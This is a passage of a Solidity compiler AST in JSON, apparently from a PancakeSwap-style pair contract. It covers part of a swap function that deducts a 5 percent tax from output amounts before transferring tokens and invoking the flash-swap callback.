														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1373,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12228:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1375,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "12228:13:1"
											},
											{
												"id": 1513,
												"nodeType": "Block",
												"src": "12251:1291:1",
												"statements": [
													{
														"assignments": [
															1377
														],
														"declarations": [
															{
																"constant": false,
																"id": 1377,
																"name": "taxamount0Out",
																"nodeType": "VariableDeclaration",
																"scope": 1513,
																"src": "12265:18:1",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1376,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "12265:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1386,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1385,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1378,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1330,
																"src": "12286:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1384,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1381,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1379,
																				"name": "amount0Out",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1330,
																				"src": "12300:10:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "*",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "35",
																				"id": 1380,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "12313:1:1",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_5_by_1",
																					"typeString": "int_const 5"
																				},
																				"value": "5"
																			},
																			"src": "12300:14:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"id": 1382,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "12299:16:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "313030",
																	"id": 1383,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12318:3:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_100_by_1",
																		"typeString": "int_const 100"
																	},
																	"value": "100"
																},
																"src": "12299:22:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "12286:35:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12265:56:1"
													},
													{
														"assignments": [
															1388
														],
														"declarations": [
															{
																"constant": false,
																"id": 1388,
																"name": "taxamount1Out",
																"nodeType": "VariableDeclaration",
																"scope": 1513,
																"src": "12335:18:1",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1387,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "12335:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1397,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1396,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1389,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1332,
																"src": "12356:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1395,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1392,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1390,
																				"name": "amount1Out",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1332,
																				"src": "12370:10:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "*",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "35",
																				"id": 1391,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "12383:1:1",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_5_by_1",
																					"typeString": "int_const 5"
																				},
																				"value": "5"
																			},
																			"src": "12370:14:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"id": 1393,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "12369:16:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "313030",
																	"id": 1394,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12388:3:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_100_by_1",
																		"typeString": "int_const 100"
																	},
																	"value": "100"
																},
																"src": "12369:22:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "12356:35:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12335:56:1"
													},
													{
														"assignments": [
															1399
														],
														"declarations": [
															{
																"constant": false,
																"id": 1399,
																"name": "_token0",
																"nodeType": "VariableDeclaration",
																"scope": 1513,
																"src": "12473:15:1",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"typeName": {
																	"id": 1398,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "12473:7:1",
																	"stateMutability": "nonpayable",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1401,
														"initialValue": {
															"argumentTypes": null,
															"id": 1400,
															"name": "token0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 475,
															"src": "12491:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12473:24:1"
													},
													{
														"assignments": [
															1403
														],
														"declarations": [
															{
																"constant": false,
																"id": 1403,
																"name": "_token1",
																"nodeType": "VariableDeclaration",
																"scope": 1513,
																"src": "12511:15:1",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"typeName": {
																	"id": 1402,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "12511:7:1",
																	"stateMutability": "nonpayable",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1405,
														"initialValue": {
															"argumentTypes": null,
															"id": 1404,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 477,
															"src": "12529:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12511:24:1"
													},
													{
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 1413,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		"id": 1409,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1407,
																			"name": "to",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1334,
																			"src": "12557:2:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "!=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1408,
																			"name": "_token0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1399,
																			"src": "12563:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"src": "12557:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		"id": 1412,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1410,
																			"name": "to",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1334,
																			"src": "12574:2:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "!=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1411,
																			"name": "_token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1403,
																			"src": "12580:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"src": "12574:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "12557:30:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"argumentTypes": null,
																	"hexValue": "50616e63616b653a20494e56414c49445f544f",
																	"id": 1414,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12589:21:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_2d7663edc966955a2d1409fdc782de8590859b8600a8a34482f57bae932ffa4e",
																		"typeString": "literal_string \"Pancake: INVALID_TO\""
																	},
																	"value": "Pancake: INVALID_TO"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_stringliteral_2d7663edc966955a2d1409fdc782de8590859b8600a8a34482f57bae932ffa4e",
																		"typeString": "literal_string \"Pancake: INVALID_TO\""
																	}
																],
																"id": 1406,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	2446,
																	2447
																],
																"referencedDeclaration": 2447,
																"src": "12549:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 1415,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "12549:62:1",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 1416,
														"nodeType": "ExpressionStatement",
														"src": "12549:62:1"
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1419,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1417,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1330,
																"src": "12629:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1418,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "12642:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "12629:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1426,
														"nodeType": "IfStatement",
														"src": "12625:61:1",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1421,
																		"name": "_token0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1399,
																		"src": "12659:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1422,
																		"name": "to",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1334,
																		"src": "12668:2:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1423,
																		"name": "taxamount0Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1377,
																		"src": "12672:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1420,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 577,
																	"src": "12645:13:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1424,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "12645:41:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1425,
															"nodeType": "ExpressionStatement",
															"src": "12645:41:1"
														}
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1429,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1427,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1332,
																"src": "12738:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1428,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "12751:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "12738:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1436,
														"nodeType": "IfStatement",
														"src": "12734:61:1",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1431,
																		"name": "_token1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1403,
																		"src": "12768:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1432,
																		"name": "to",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1334,
																		"src": "12777:2:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1433,
																		"name": "taxamount1Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1388,
																		"src": "12781:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1430,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 577,
																	"src": "12754:13:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1434,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "12754:41:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1435,
															"nodeType": "ExpressionStatement",
															"src": "12754:41:1"
														}
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1440,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1437,
																	"name": "data",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1336,
																	"src": "12847:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_calldata_ptr",
																		"typeString": "bytes calldata"
																	}
																},
																"id": 1438,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "12847:11:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1439,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "12861:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "12847:15:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1452,
														"nodeType": "IfStatement",
														"src": "12843:244:1",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 1445,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2443,
																			"src": "12932:3:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 1446,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "12932:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1447,
																		"name": "taxamount0Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1377,
																		"src": "12964:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1448,
																		"name": "taxamount1Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1388,
																		"src": "13014:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1449,
																		"name": "data",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1336,
																		"src": "13065:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_calldata_ptr",
																			"typeString": "bytes calldata"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		{
																			"typeIdentifier": "t_bytes_calldata_ptr",
																			"typeString": "bytes calldata"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1442,
																				"name": "to",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1334,
																				"src": "12895:2:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			],
																			"id": 1441,
																			"name": "IPancakeCallee",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1798,
																			"src": "12880:14:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_IPancakeCallee_$1798_$",
																				"typeString": "type(contract IPancakeCallee)"
																			}
																		},
																		"id": 1443,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "12880:18:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_IPancakeCallee_$1798",
																			"typeString": "contract IPancakeCallee"
																		}
																	},
																	"id": 1444,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "pancakeCall",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 1797,
																	"src": "12880:30:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$_t_uint256_$_t_bytes_memory_ptr_$returns$__$",
																		"typeString": "function (address,uint256,uint256,bytes memory) external"
																	}
																},
																"id": 1450,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "12880:207:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1451,
															"nodeType": "ExpressionStatement",
															"src": "12880:207:1"
														}
													},
													{
														"assignments": [
															1454
														],
														"declarations": [
															{
																"constant": false,
																"id": 1454,
																"name": "tax0",
																"nodeType": "VariableDeclaration",
																"scope": 1513,
																"src": "13102:9:1",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1453,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "13102:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1461,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1460,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 1457,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1455,
																			"name": "amount0Out",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1330,
																			"src": "13115:10:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "*",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "35",
																			"id": 1456,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "13128:1:1",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_5_by_1",
																				"typeString": "int_const 5"
																			},
																			"value": "5"
																		},
																		"src": "13115:14:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 1458,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "13114:16:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 1459,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13133:3:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "13114:22:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "13102:34:1"
													},
													{
														"assignments": [
															1463
														],
														"declarations": [
															{
																"constant": false,
																"id": 1463,
																"name": "tax1",
																"nodeType": "VariableDeclaration",
																"scope": 1513,
																"src": "13150:9:1",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1462,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "13150:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
